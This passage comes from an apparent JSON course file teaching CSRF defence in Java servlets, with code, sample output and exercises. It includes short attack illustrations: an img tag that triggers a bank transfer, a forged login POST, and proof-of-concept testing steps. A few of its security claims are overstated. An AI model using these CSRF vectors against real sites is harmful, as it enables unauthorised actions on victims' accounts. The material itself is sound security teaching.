out.println(\"<button type='submit'>Transfer</button>\");\n        out.println(\"</form>\");\n    }\n    \n    protected void doPost(HttpServletRequest request,\n                          HttpServletResponse response)\n            throws ServletException, IOException {\n        \n        HttpSession session = request.getSession(false);\n        if (session == null) {\n            response.sendRedirect(\"/login\");\n            return;\n        }\n        \n        // CSRF DEFENCE: Validate token\n        String sessionToken = (String) session.getAttribute(\"csrf_token\");\n        String formToken = request.getParameter(\"csrf_token\");\n        \n        if (sessionToken == null || formToken == null ||\n            !MessageDigest.isEqual(\n                sessionToken.getBytes(), formToken.getBytes())) {\n            response.sendError(403, \"CSRF validation failed\");\n            System.out.println(\"CSRF ATTACK BLOCKED!\");\n            return;\n        }\n        \n        // Token valid -- regenerate for next request\n        session.setAttribute(\"csrf_token\",\n            CSRFTokenGenerator.generateToken());\n        \n        String user = (String) session.getAttribute(\"user\");\n        String amount = request.getParameter(\"amount\");\n        String to = request.getParameter(\"to\");\n        \n        System.out.println(\"Transfer: \" + user + \" -> \" + to + \": $\" + amount);\n        response.getWriter().println(\"Transfer successful!\");\n    }\n}",
+          "output": "Legitimate request: Transfer: alice -> friend: $50\nCSRF attack: HTTP 403 -- CSRF validation failed\nConsole: CSRF ATTACK BLOCKED!",
+          "ai_explanation": "Three changes from the vulnerable version: (1) doGet generates a token and embeds it as a hidden field, (2) doPost validates the token before processing, (3) After successful validation, the token is regenerated (one-time use). The attacker's forged form will not have the correct token because they cannot read it from the real page.",
+          "ai_challenge": "What happens if the user opens the transfer page in two browser tabs? Both tabs get different tokens but the session stores only the last one. How would you handle this?"
+        },
+        {
+          "title": "Example 6: SameSite Cookie Configuration",
+          "description": "Configure cookies with SameSite attribute for CSRF defence",
+          "difficulty": "intermediate",
+          "code": "import javax.servlet.http.*;\n\npublic class SecureCookieConfig {\n    \n    /**\n     * Set session cookie with all security attributes.\n     */\n    public static void setSecureSessionCookie(\n            HttpServletResponse response, String sessionId) {\n        \n        // Build cookie string with all security flags\n        StringBuilder cookie = new StringBuilder();\n        cookie.append(\"JSESSIONID=\").append(sessionId);\n        cookie.append(\"; Path=/\");\n        cookie.append(\"; HttpOnly\");    // Prevents XSS reading cookie\n        cookie.append(\"; Secure\");      // HTTPS only\n        cookie.append(\"; SameSite=Lax\"); // CSRF protection\n        cookie.append(\"; Max-Age=1800\"); // 30 min timeout\n        \n        response.setHeader(\"Set-Cookie\", cookie.toString());\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== Cookie Security Comparison ===\");\n        System.out.println();\n        \n        // INSECURE cookie\n        System.out.println(\"INSECURE:\");\n        System.out.println(\"Set-Cookie: JSESSIONID=abc123\");\n        System.out.println(\"  - No HttpOnly: XSS can steal it\");\n        System.out.println(\"  - No Secure: sent over HTTP (sniffable)\");\n        System.out.println(\"  - No SameSite: CSRF attacks work\");\n        System.out.println();\n        \n        // SECURE cookie\n        System.out.println(\"SECURE:\");\n        System.out.println(\"Set-Cookie: JSESSIONID=abc123; \"\n            + \"Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800\");\n        System.out.println(\"  - HttpOnly: JavaScript cannot read\");\n        System.out.println(\"  - Secure: HTTPS only\");\n        System.out.println(\"  - SameSite=Lax: blocks CSRF POST/AJAX\");\n        System.out.println(\"  - Max-Age: auto-expires in 30 min\");\n    }\n}",
+          "output": "=== Cookie Security Comparison ===\n\nINSECURE:\nSet-Cookie: JSESSIONID=abc123\n  - No HttpOnly: XSS can steal it\n  - No Secure: sent over HTTP (sniffable)\n  - No SameSite: CSRF attacks work\n\nSECURE:\nSet-Cookie: JSESSIONID=abc123; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800\n  - HttpOnly: JavaScript cannot read\n  - Secure: HTTPS only\n  - SameSite=Lax: blocks CSRF POST/AJAX\n  - Max-Age: auto-expires in 30 min",
+          "ai_explanation": "Each cookie flag addresses a different attack: HttpOnly blocks XSS cookie theft, Secure prevents network sniffing, SameSite blocks CSRF, and Max-Age limits the window of opportunity. A cookie without these flags is like a house key left under the doormat.",
+          "ai_challenge": "Change SameSite to Strict and explain what legitimate functionality would break. Then change it to None and explain what security is lost."
+        },
+        {
+          "title": "Example 7: CSRF Attack Detector",
+          "description": "Build a system that logs and detects CSRF attack attempts",
+          "difficulty": "intermediate",
+          "code": "import java.security.MessageDigest;\nimport java.time.LocalDateTime;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class CSRFAttackDetector {\n    \n    private List<String> attackLog = new ArrayList<>();\n    private int blockedCount = 0;\n    \n    public boolean validateToken(String sessionToken, String requestToken,\n                                 String clientIP, String endpoint) {\n        \n        // Case 1: No token provided (likely CSRF)\n        if (requestToken == null || requestToken.isEmpty()) {\n            logAttack(\"MISSING_TOKEN\", clientIP, endpoint);\n            return false;\n        }\n        \n        // Case 2: No session token (session expired or new)\n        if (sessionToken == null) {\n            logAttack(\"SESSION_EXPIRED\", clientIP, endpoint);\n            return false;\n        }\n        \n        // Case 3: Token mismatch (tampered or forged)\n        if (!MessageDigest.isEqual(\n                sessionToken.getBytes(), requestToken.getBytes())) {\n            logAttack(\"TOKEN_MISMATCH\", clientIP, endpoint);\n            return false;\n        }\n        \n        return true; // Valid\n    }\n    \n    private void logAttack(String type, String ip, String endpoint) {\n        blockedCount++;\n        String entry = String.format(\"[%s] CSRF BLOCKED: %s from %s on %s\",\n            LocalDateTime.now(), type, ip, endpoint);\n        attackLog.add(entry);\n        System.out.println(entry);\n    }\n    \n    public void printReport() {\n        System.out.println(\"\\n=== CSRF Attack Report ===\");\n        System.out.println(\"Total blocked: \" + blockedCount);\n        for (String entry : attackLog) {\n            System.out.println(\"  \" + entry);\n        }\n    }\n    \n    public static void main(String[] args) {\n        CSRFAttackDetector detector = new CSRFAttackDetector();\n        \n        String validToken = \"abc123secure\";\n        \n        // Test 1: Valid request\n        System.out.println(\"Test 1 (valid): \" +\n            detector.validateToken(validToken, validToken, \"192.168.1.1\", \"/transfer\"));\n        \n        // Test 2: Missing token (CSRF attack)\n        System.out.println(\"Test 2 (missing): \" +\n            detector.validateToken(validToken, null, \"10.0.0.5\", \"/transfer\"));\n        \n        // Test 3: Wrong token (CSRF attack)\n        System.out.println(\"Test 3 (wrong): \" +\n            detector.validateToken(validToken, \"evil_token\", \"10.0.0.5\", \"/change-email\"));\n        \n        // Test 4: Expired session\n        System.out.println(\"Test 4 (expired): \" +\n            detector.validateToken(null, \"some_token\", \"10.0.0.5\", \"/settings\"));\n        \n        detector.printReport();\n    }\n}",
+          "output": "Test 1 (valid): true\n[timestamp] CSRF BLOCKED: MISSING_TOKEN from 10.0.0.5 on /transfer\nTest 2 (missing): false\n[timestamp] CSRF BLOCKED: TOKEN_MISMATCH from 10.0.0.5 on /change-email\nTest 3 (wrong): false\n[timestamp] CSRF BLOCKED: SESSION_EXPIRED from 10.0.0.5 on /settings\nTest 4 (expired): false\n\n=== CSRF Attack Report ===\nTotal blocked: 3\n  [timestamp] CSRF BLOCKED: MISSING_TOKEN from 10.0.0.5 on /transfer\n  [timestamp] CSRF BLOCKED: TOKEN_MISMATCH from 10.0.0.5 on /change-email\n  [timestamp] CSRF BLOCKED: SESSION_EXPIRED from 10.0.0.5 on /settings",
+          "ai_explanation": "This detector handles 3 failure modes: missing token (attacker did not include one), wrong token (attacker guessed), and expired session. Logging attack details helps security teams identify patterns -- like repeated attacks from the same IP or targeting the same endpoint.",
+          "ai_challenge": "Add rate limiting: if the same IP triggers 5 CSRF blocks in 10 minutes, automatically block that IP for 1 hour. How would you implement this?"
+        },
+        {
+          "title": "Example 8: Double Submit Cookie Implementation",
+          "description": "Implement the stateless CSRF protection pattern",
+          "difficulty": "intermediate",
+          "code": "import java.security.SecureRandom;\nimport java.util.Base64;\nimport java.security.MessageDigest;\n\npublic class DoubleSubmitCSRF {\n    \n    /**\n     * Simulates Double Submit Cookie pattern.\n     * Token is set as BOTH cookie AND form hidden field.\n     * Server compares the two -- they must match.\n     */\n    \n    static String generateToken() {\n        byte[] bytes = new byte[32];\n        new SecureRandom().nextBytes(bytes);\n        return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);\n    }\n    \n    static boolean validate(String cookieToken, String formToken) {\n        if (cookieToken == null || formToken == null) return false;\n        return MessageDigest.isEqual(\n            cookieToken.getBytes(), formToken.getBytes());\n    }\n    \n    public static void main(String[] args) {\n        // Server generates token\n        String token = generateToken();\n        System.out.println(\"Generated token: \" + token.substring(0, 10) + \"...\");\n        \n        // Normal: both cookie and form have same token\n        System.out.println(\"\\n--- Legitimate Request ---\");\n        System.out.println(\"Cookie: csrf=\" + token.substring(0, 10) + \"...\");\n        System.out.println(\"Form:   csrf=\" + token.substring(0, 10) + \"...\");\n        System.out.println(\"Valid: \" + validate(token, token));\n        \n        // Attack: attacker can make browser SEND cookie\n        // but cannot READ it to put in form\n        System.out.println(\"\\n--- CSRF Attack ---\");\n        System.out.println(\"Cookie: csrf=\" + token.substring(0, 10) + \"... (sent automatically)\");\n        System.out.println(\"Form:   csrf=??? (attacker cannot read the cookie!)\");\n        System.out.println(\"Valid: \" + validate(token, null));\n        \n        // Attack: attacker guesses wrong token\n        String fakeToken = generateToken();\n        System.out.println(\"\\n--- Attack with Fake Token ---\");\n        System.out.println(\"Cookie: csrf=\" + token.substring(0, 10) + \"...\");\n        System.out.println(\"Form:   csrf=\" + fakeToken.substring(0, 10) + \"...\");\n        System.out.println(\"Valid: \" + validate(token, fakeToken));\n    }\n}",
+          "output": "Generated token: kX7mP2qR9v...\n\n--- Legitimate Request ---\nCookie: csrf=kX7mP2qR9v...\nForm:   csrf=kX7mP2qR9v...\nValid: true\n\n--- CSRF Attack ---\nCookie: csrf=kX7mP2qR9v... (sent automatically)\nForm:   csrf=??? (attacker cannot read the cookie!)\nValid: false\n\n--- Attack with Fake Token ---\nCookie: csrf=kX7mP2qR9v...\nForm:   csrf=aB3nZ8wQ1x...\nValid: false",
+          "ai_explanation": "Double Submit works because of Same-Origin Policy: JavaScript on evil-site.com can trigger requests to bank.com (cookies sent automatically), but it CANNOT read bank.com's cookies. So the attacker can cause the cookie to be sent but cannot copy its value into the form field.",
+          "ai_challenge": "Research: what happens if the attacker has XSS on a subdomain (e.g., blog.bank.com) and sets a cookie for .bank.com? How does this break Double Submit?"
+        },
+        {
+          "title": "Example 9: Origin and Referer Header Validation",
+          "description": "Check request origin as secondary CSRF defence",
+          "difficulty": "advanced",
+          "code": "import java.util.Arrays;\nimport java.util.List;\n\npublic class OriginValidator {\n    \n    private static final List<String> ALLOWED_ORIGINS = Arrays.asList(\n        \"https://mybank.com\",\n        \"https://www.mybank.com\"\n    );\n    \n    public static String validateRequest(String origin, String referer,\n                                         String method) {\n        // GET requests are safe (read-only)\n        if (\"GET\".equalsIgnoreCase(method)) {\n            return \"ALLOWED (safe method)\";\n        }\n        \n        // Check Origin header first (most reliable)\n        if (origin != null && !origin.isEmpty()) {\n            if (ALLOWED_ORIGINS.contains(origin)) {\n                return \"ALLOWED (valid origin: \" + origin + \")\";\n            }\n            return \"BLOCKED (invalid origin: \" + origin + \")\";\n        }\n        \n        // Fall back to Referer header\n        if (referer != null && !referer.isEmpty()) {\n            for (String allowed : ALLOWED_ORIGINS) {\n                if (referer.startsWith(allowed + \"/\")) {\n                    return \"ALLOWED (valid referer)\";\n                }\n            }\n            return \"BLOCKED (invalid referer: \" + referer + \")\";\n        }\n        \n        // Both missing -- strict mode rejects\n        return \"BLOCKED (no origin or referer)\";\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== Origin Validation Tests ===\");\n        \n        System.out.println(\"1. \" + validateRequest(\n            \"https://mybank.com\", null, \"POST\"));\n        \n        System.out.println(\"2. \" + validateRequest(\n            \"https://evil-site.com\", null, \"POST\"));\n        \n        System.out.println(\"3. \" + validateRequest(\n            null, \"https://mybank.com/transfer\", \"POST\"));\n        \n        System.out.println(\"4. \" + validateRequest(\n            null, \"https://evil-site.com/attack\", \"POST\"));\n        \n        System.out.println(\"5. \" + validateRequest(\n            null, null, \"POST\"));\n        \n        System.out.println(\"6. \" + validateRequest(\n            null, null, \"GET\"));\n    }\n}",
+          "output": "=== Origin Validation Tests ===\n1. ALLOWED (valid origin: https://mybank.com)\n2. BLOCKED (invalid origin: https://evil-site.com)\n3. ALLOWED (valid referer)\n4. BLOCKED (invalid referer: https://evil-site.com/attack)\n5. BLOCKED (no origin or referer)\n6. ALLOWED (safe method)",
+          "ai_explanation": "Origin header is preferred over Referer because: (1) it only contains scheme+domain, not the full URL path (more privacy-friendly), (2) it is more consistently sent with POST requests, (3) it is harder to strip or modify. Referer can be suppressed by the Referrer-Policy header or by navigating from HTTPS to HTTP.",
+          "ai_challenge": "What should the server do when both Origin and Referer are missing? Some privacy extensions strip these headers. Should you block the request (secure but may break things) or allow it (convenient but less secure)?"
+        },
+        {
+          "title": "Example 10: Complete CSRF Filter for Java Servlets",
+          "description": "A production-ready CSRF filter that protects all endpoints",
+          "difficulty": "advanced",
+          "code": "import javax.servlet.*;\nimport javax.servlet.http.*;\nimport java.io.IOException;\nimport java.security.MessageDigest;\nimport java.security.SecureRandom;\nimport java.util.Base64;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class CSRFFilter implements Filter {\n    \n    private static final List<String> SAFE_METHODS =\n        Arrays.asList(\"GET\", \"HEAD\", \"OPTIONS\");\n    private static final List<String> ALLOWED_ORIGINS =\n        Arrays.asList(\"https://myapp.com\");\n    \n    @Override\n    public void doFilter(ServletRequest req, ServletResponse res,\n                         FilterChain chain)\n            throws IOException, ServletException {\n        \n        HttpServletRequest request = (HttpServletRequest) req;\n        HttpServletResponse response = (HttpServletResponse) res;\n        HttpSession session = request.getSession(true);\n        \n        // Ensure token exists\n        if (session.getAttribute(\"csrf_token\") == null) {\n            session.setAttribute(\"csrf_token\", generateToken());\n        }\n        \n        String method = request.getMethod().toUpperCase();\n        \n        // Allow safe (read-only) methods\n        if (SAFE_METHODS.contains(method)) {\n            request.setAttribute(\"csrf_token\",\n                session.getAttribute(\"csrf_token\"));\n            chain.doFilter(req, res);\n            return;\n        }\n        \n        // Check Origin header\n        String origin = request.getHeader(\"Origin\");\n        if (origin != null && !ALLOWED_ORIGINS.contains(origin)) {\n            System.out.println(\"CSRF BLOCKED: Bad origin \" + origin);\n            response.sendError(403, \"Invalid origin\");\n            return;\n        }\n        \n        // Validate CSRF token\n        String sessionToken = (String) session.getAttribute(\"csrf_token\");\n        String requestToken = request.getParameter(\"csrf_token\");\n        \n        // Also check custom header (for AJAX)\n        if (requestToken == null) {\n            requestToken = request.getHeader(\"X-CSRF-Token\");\n        }\n        \n        if (sessionToken == null || requestToken == null ||\n            !MessageDigest.isEqual(\n                sessionToken.getBytes(), requestToken.getBytes())) {\n            System.out.println(\"CSRF BLOCKED: Token mismatch on \"\n                + request.getRequestURI());\n            response.sendError(403, \"CSRF token invalid\");\n            return;\n        }\n        \n        // Valid -- regenerate token\n        session.setAttribute(\"csrf_token\", generateToken());\n        chain.doFilter(req, res);\n    }\n    \n    private String generateToken() {\n        byte[] bytes = new byte[32];\n        new SecureRandom().nextBytes(bytes);\n        return Base64.getUrlEncoder().withoutPadding()\n                     .encodeToString(bytes);\n    }\n}",
+          "output": "GET /transfer -> ALLOWED (safe method, token embedded in form)\nPOST /transfer (valid token) -> ALLOWED (token matches)\nPOST /transfer (no token) -> 403 CSRF token invalid\nPOST /transfer (Origin: evil-site.com) -> 403 Invalid origin\nAJAX POST with X-CSRF-Token header -> ALLOWED (if token valid)",
+          "ai_explanation": "This filter implements defence in depth: (1) Safe methods pass through, (2) Origin header checked first, (3) CSRF token validated from either form parameter or custom header (supporting both forms and AJAX), (4) Token regenerated after each valid request. Register this filter in web.xml or with @WebFilter annotation to protect all endpoints automatically.",
+          "ai_challenge": "Add logging to track: (1) how many CSRF attacks are blocked per hour, (2) which endpoints are targeted most, (3) which IPs trigger the most blocks. This data helps identify real attacks vs false positives."
+        },
+        {
+          "title": "Example 11: CSRF in Login Forms (Login CSRF)",
+          "description": "Understand the less-known login CSRF attack",
+          "difficulty": "advanced",
+          "code": "// === LOGIN CSRF -- The Overlooked Attack ===\n//\n// Most developers protect transfers and settings.\n// But what about the LOGIN form itself?\n//\n// Attack: attacker logs the victim into the ATTACKER's account.\n//\n// Why? If the victim thinks they are in their own account,\n// they might:\n// - Save their credit card (in attacker's account)\n// - Upload private files (to attacker's cloud)\n// - Enter personal info (stored in attacker's profile)\n\npublic class LoginCSRFDemo {\n    public static void main(String[] args) {\n        System.out.println(\"=== Login CSRF Attack ===\");\n        System.out.println();\n        System.out.println(\"ATTACK STEPS:\");\n        System.out.println(\"1. Attacker creates account: evil@hacker.com / pass123\");\n        System.out.println(\"2. Attacker's page auto-submits login form:\");\n        System.out.println(\"   POST /login\");\n        System.out.println(\"   username=evil@hacker.com&password=pass123\");\n        System.out.println(\"3. Victim is now logged into ATTACKER's account\");\n        System.out.println(\"4. Victim saves credit card -> attacker's account\");\n        System.out.println(\"5. Victim uploads files -> attacker's cloud\");\n        System.out.println();\n        System.out.println(\"DEFENCE:\");\n        System.out.println(\"- Add CSRF token to login form too\");\n        System.out.println(\"- Use pre-session tokens (before login)\");\n        System.out.println(\"- Show logged-in username prominently\");\n        System.out.println(\"- Require re-authentication for sensitive actions\");\n    }\n}",
+          "output": "=== Login CSRF Attack ===\n\nATTACK STEPS:\n1. Attacker creates account: evil@hacker.com / pass123\n2. Attacker's page auto-submits login form:\n   POST /login\n   username=evil@hacker.com&password=pass123\n3. Victim is now logged into ATTACKER's account\n4. Victim saves credit card -> attacker's account\n5. Victim uploads files -> attacker's cloud\n\nDEFENCE:\n- Add CSRF token to login form too\n- Use pre-session tokens (before login)\n- Show logged-in username prominently\n- Require re-authentication for sensitive actions",
+          "ai_explanation": "Login CSRF is counter-intuitive: the attacker logs the victim into the ATTACKER's own account. The danger is that the victim does not realise they are in someone else's account and enters sensitive information. Google, PayPal, and financial institutions all protect their login forms with CSRF tokens.",
+          "ai_challenge": "Design a detection system: how would the application detect that a user is logged into an account from a different device/location than usual?"
+        },
+        {
+          "title": "Example 12: Testing for CSRF Vulnerabilities",
+          "description": "How to check if a web application is vulnerable to CSRF",
+          "difficulty": "advanced",
+          "code": "public class CSRFTestingChecklist {\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF Vulnerability Testing Checklist ===\");\n        System.out.println();\n        \n        String[] checks = {\n            \"1. IDENTIFY state-changing endpoints (POST/PUT/DELETE)\",\n            \"   -> Transfer, settings, password change, email change\",\n            \"   -> Delete account, post content, admin actions\",\n            \"\",\n            \"2. CHECK for CSRF tokens in forms\",\n            \"   -> View page source: look for hidden csrf_token field\",\n            \"   -> If no token: VULNERABLE\",\n            \"\",\n            \"3. TEST token validation\",\n            \"   -> Remove token from request -> should get 403\",\n            \"   -> Change one character in token -> should get 403\",\n            \"   -> Use token from different session -> should get 403\",\n            \"   -> If any passes: VULNERABLE\",\n            \"\",\n            \"4. CHECK cookie attributes\",\n            \"   -> SameSite=Lax or Strict? If None: PARTIAL VULN\",\n            \"   -> HttpOnly set? If not: XSS can steal token\",\n            \"   -> Secure set? If not: token exposed on HTTP\",\n            \"\",\n            \"5. TEST with CSRF proof-of-concept\",\n            \"   -> Create HTML page with hidden form to target\",\n            \"   -> Open in browser while logged into target\",\n            \"   -> If action succeeds: CONFIRMED VULNERABLE\",\n            \"\",\n            \"6. CHECK AJAX endpoints\",\n            \"   -> Do they require X-CSRF-Token header?\",\n            \"   -> Can you make requests without custom headers?\",\n            \"   -> CORS policy: is Access-Control-Allow-Origin: * set?\",\n            \"\",\n            \"7. VERIFY Origin/Referer checks\",\n            \"   -> Send POST without Origin header -> should block\",\n            \"   -> Send POST with evil Origin -> should block\"\n        };\n        \n        for (String check : checks) {\n            System.out.println(check);\n        }\n    }\n}",
+          "output": "=== CSRF Vulnerability Testing Checklist ===\n\n1. IDENTIFY state-changing endpoints...\n2. CHECK for CSRF tokens in forms...\n3. TEST token validation...\n4. CHECK cookie attributes...\n5. TEST with CSRF proof-of-concept...\n6. CHECK AJAX endpoints...\n7. VERIFY Origin/Referer checks...",
+          "ai_explanation": "Security testing follows a systematic approach: identify the attack surface, check for defences, try to bypass them, and verify with a proof of concept. Professional penetration testers use tools like Burp Suite to automate CSRF testing, but understanding the manual process is essential.",
+          "ai_challenge": "Pick any web application you use daily. Without doing anything malicious, view the page source on a form page. Can you find a CSRF token? What is it called? Is it in a hidden field or a meta tag?"
+        },
+        {
+          "title": "Example 13: CSRF Protection in REST APIs",
+          "description": "How CSRF applies to modern API-based applications",
+          "difficulty": "advanced",
+          "code": "// REST APIs have different CSRF considerations:\n//\n// 1. Cookie-based auth (session cookies) -> NEEDS CSRF protection\n// 2. Token-based auth (Bearer token in header) -> CSRF-immune!\n//\n// Why? Bearer tokens are NOT sent automatically by the browser.\n// The client JavaScript must explicitly add the Authorization header.\n// An attacker's page cannot add headers to cross-origin requests.\n\npublic class APICSRFAnalysis {\n    public static void main(String[] args) {\n        System.out.println(\"=== REST API CSRF Analysis ===\");\n        System.out.println();\n        \n        System.out.println(\"COOKIE AUTH (vulnerable to CSRF):\");\n        System.out.println(\"  Request: POST /api/transfer\");\n        System.out.println(\"  Cookie: session=abc123  <- sent automatically!\");\n        System.out.println(\"  Body: {amount: 1000, to: evil}\");\n        System.out.println(\"  CSRF possible: YES\");\n        System.out.println();\n        \n        System.out.println(\"BEARER TOKEN AUTH (immune to CSRF):\");\n        System.out.println(\"  Request: POST /api/transfer\");\n        System.out.println(\"  Authorization: Bearer eyJhbGci...  <- NOT automatic!\");\n        System.out.println(\"  Body: {amount: 1000, to: evil}\");\n        System.out.println(\"  CSRF possible: NO\");\n        System.out.println(\"  (attacker cannot add Authorization header cross-origin)\");\n        System.out.println();\n        \n        System.out.println(\"MIXED AUTH (common in SPAs):\");\n        System.out.println(\"  Login creates session cookie (for page loads)\");\n        System.out.println(\"  API uses CSRF token in X-CSRF-Token header\");\n        System.out.println(\"  Both needed: cookie (auto) + token (manual)\");\n        System.out.println(\"  CSRF possible: NO (attacker cannot set custom header)\");\n    }\n}",
+          "output": "=== REST API CSRF Analysis ===\n\nCOOKIE AUTH (vulnerable to CSRF):\n  Request: POST /api/transfer\n  Cookie: session=abc123  <- sent automatically!\n  CSRF possible: YES\n\nBEARER TOKEN AUTH (immune to CSRF):\n  Request: POST /api/transfer\n  Authorization: Bearer eyJhbGci...  <- NOT automatic!\n  CSRF possible: NO\n\nMIXED AUTH (common in SPAs):\n  Both needed: cookie (auto) + token (manual)\n  CSRF possible: NO",
+          "ai_explanation": "Bearer token auth is inherently CSRF-proof because the token must be explicitly added by JavaScript. However, if the bearer token is stored in a cookie (instead of localStorage), CSRF becomes possible again. The storage location matters!",
+          "ai_challenge": "If a Single Page App stores the JWT in localStorage, is it safe from CSRF? What about XSS? Which storage method (cookie vs localStorage) is better and why?"
+        },
+        {
+          "title": "Example 14: Defence in Depth -- Combining All Protections",
+          "description": "Build a comprehensive CSRF defence strategy",
+          "difficulty": "advanced",
+          "code": "public class CSRFDefenceStrategy {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF Defence in Depth ===\");\n        System.out.println();\n        \n        System.out.println(\"LAYER 1: SameSite Cookies\");\n        System.out.println(\"  Set-Cookie: session=...; SameSite=Lax; Secure; HttpOnly\");\n        System.out.println(\"  Blocks: POST/AJAX from other sites (automatic)\");\n        System.out.println(\"  Weakness: Old browsers, cookie injection\");\n        System.out.println();\n        \n        System.out.println(\"LAYER 2: CSRF Tokens\");\n        System.out.println(\"  Generate: SecureRandom 32 bytes, Base64\");\n        System.out.println(\"  Store: server session\");\n        System.out.println(\"  Send: hidden form field + X-CSRF-Token header\");\n        System.out.println(\"  Validate: constant-time comparison\");\n        System.out.println(\"  Blocks: All CSRF (attacker cannot read token)\");\n        System.out.println(\"  Weakness: XSS can read token from page\");\n        System.out.println();\n        \n        System.out.println(\"LAYER 3: Origin/Referer Checks\");\n        System.out.println(\"  Check: Origin header on all POST requests\");\n        System.out.println(\"  Fallback: Referer header\");\n        System.out.println(\"  Blocks: Cross-origin requests\");\n        System.out.println(\"  Weakness: Headers can be stripped\");\n        System.out.println();\n        \n        System.out.println(\"LAYER 4: Re-authentication\");\n        System.out.println(\"  For: password change, email change, transfers\");\n        System.out.println(\"  Require: current password or 2FA code\");\n        System.out.println(\"  Blocks: Even if CSRF succeeds, attacker needs password\");\n        System.out.println(\"  Weakness: None (strongest defence)\");\n        System.out.println();\n        \n        System.out.println(\"COMBINED: All 4 layers must be bypassed for attack.\");\n        System.out.println(\"This is Defence in Depth.\");\n    }\n}",
+          "output": "=== CSRF Defence in Depth ===\n\nLAYER 1: SameSite Cookies\n  Blocks: POST/AJAX from other sites\n\nLAYER 2: CSRF Tokens\n  Blocks: All CSRF (attacker cannot read token)\n\nLAYER 3: Origin/Referer Checks\n  Blocks: Cross-origin requests\n\nLAYER 4: Re-authentication\n  Blocks: Even if CSRF succeeds, attacker needs password\n\nCOMBINED: All 4 layers must be bypassed for attack.",
+          "ai_explanation": "No single defence is perfect. SameSite fails on old browsers. Tokens fail if XSS exists. Headers can be stripped. But combining all four means an attacker must bypass EVERY layer simultaneously -- which is practically impossible. This is the principle of Defence in Depth applied to CSRF.",
+          "ai_challenge": "For a banking application, rank these 4 layers from most important to least important. Justify your ranking."
+        }
+      ],
+      "visual_diagram": {
+        "title": "CSRF Attack and Defence Flow",
+        "content": "<div style=\"font-family: monospace; line-height: 1.8;\">\n<span style=\"background: #e74c3c; color: white; padding: 6px 16px; border-radius: 6px; font-weight: bold;\">CSRF ATTACK FLOW</span>\n\n<span style=\"background: #3498db; color: white; padding: 4px 12px; border-radius: 4px;\">STEP 1: LOGIN</span>\n  <span style=\"color: #3498db;\">User logs into bank.com</span>\n  <span style=\"color: #3498db;\">Browser stores session cookie</span>\n        |\n        v\n<span style=\"background: #f39c12; color: white; padding: 4px 12px; border-radius: 4px;\">STEP 2: BAIT</span>\n  <span style=\"color: #f39c12;\">User visits evil-site.com (email link, ad, forum)</span>\n  <span style=\"color: #f39c12;\">User has NOT logged out of bank.com</span>\n        |\n        v\n<span style=\"background: #e74c3c; color: white; padding: 4px 12px; border-radius: 4px;\">STEP 3: TRIGGER</span>\n  <span style=\"color: #e74c3c;\">Evil page contains hidden form/img/script</span>\n  <span style=\"color: #e74c3c;\">Auto-submits request to bank.com</span>\n  <span style=\"color: #e74c3c;\">THREE attack methods:</span>\n    <span style=\"color: #e74c3c;\">a) &lt;img src=\"bank.com/xfer?amt=1000\"&gt;</span>\n    <span style=\"color: #e74c3c;\">b) Hidden form with auto-submit</span>\n    <span style=\"color: #e74c3c;\">c) XMLHttpRequest / fetch()</span>\n        |\n        v\n<span style=\"background: #9b59b6; color: white; padding: 4px 12px; border-radius: 4px;\">STEP 4: EXECUTION</span>\n  <span style=\"color: #9b59b6;\">Browser sends request to bank.com</span>\n  <span style=\"color: #9b59b6;\">Cookie attached AUTOMATICALLY</span>\n  <span style=\"color: #9b59b6;\">Bank sees valid session -- processes transfer</span>\n  <span style=\"color: #e74c3c; font-weight: bold;\">VICTIM LOSES MONEY!</span>\n\n\n<span style=\"background: #2ecc71; color: white; padding: 6px 16px; border-radius: 6px; font-weight: bold;\">CSRF DEFENCE FLOW</span>\n\n<span style=\"background: #3498db; color: white; padding: 4px 12px; border-radius: 4px;\">CHECK 1: SameSite Cookie</span>\n  <span style=\"color: #3498db;\">Is request from same site?</span>\n    <span style=\"color: #2ecc71;\">YES</span> --> Continue to Check 2\n    <span style=\"color: #e74c3c;\">NO</span>  --> <span style=\"color: #e74c3c; font-weight: bold;\">BLOCK (cookie not sent)</span>\n        |\n        v\n<span style=\"background: #3498db; color: white; padding: 4px 12px; border-radius: 4px;\">CHECK 2: Origin Header</span>\n  <span style=\"color: #3498db;\">Does Origin match our domain?</span>\n    <span style=\"color: #2ecc71;\">YES</span> --> Continue to Check 3\n    <span style=\"color: #e74c3c;\">NO</span>  --> <span style=\"color: #e74c3c; font-weight: bold;\">BLOCK (wrong origin)</span>\n        |\n        v\n<span style=\"background: #3498db; color: white; padding: 4px 12px; border-radius: 4px;\">CHECK 3: CSRF Token</span>\n  <span style=\"color: #3498db;\">Does form token match session token?</span>\n    <span style=\"color: #2ecc71;\">YES</span> --> <span style=\"color: #2ecc71; font-weight: bold;\">ALLOW REQUEST</span>\n    <span style=\"color: #e74c3c;\">NO</span>  --> <span style=\"color: #e74c3c; font-weight: bold;\">BLOCK (invalid token)</span>\n\n\n<span style=\"background: #1abc9c; color: white; padding: 6px 16px; border-radius: 6px; font-weight: bold;\">CSRF vs XSS COMPARISON</span>\n\n  <span style=\"background: #e74c3c; color: white; padding: 4px 12px; border-radius: 4px;\">CSRF</span>                    <span style=\"background: #9b59b6; color: white; padding: 4px 12px; border-radius: 4px;\">XSS</span>\n  <span style=\"color: #e74c3c;\">Tricks browser</span>              <span style=\"color: #9b59b6;\">Injects code</span>\n  <span style=\"color: #e74c3c;\">From DIFFERENT site</span>         <span style=\"color: #9b59b6;\">Runs ON your site</span>\n  <span style=\"color: #e74c3c;\">Cannot read responses</span>       <span style=\"color: #9b59b6;\">Full page access</span>\n  <span style=\"color: #e74c3c;\">Performs ACTIONS</span>            <span style=\"color: #9b59b6;\">Steals DATA</span>\n  <span style=\"color: #e74c3c;\">Defence: tokens + SameSite</span>  <span style=\"color: #9b59b6;\">Defence: output encoding</span>\n  <span style=\"color: #f39c12; font-weight: bold;\">WARNING: XSS can bypass CSRF tokens!</span>\n\n\n<span style=\"background: #2c3e50; color: white; padding: 6px 16px; border-radius: 6px; font-weight: bold;\">REMEMBER</span>\n\n  <span style=\"color: #e74c3c; font-weight: 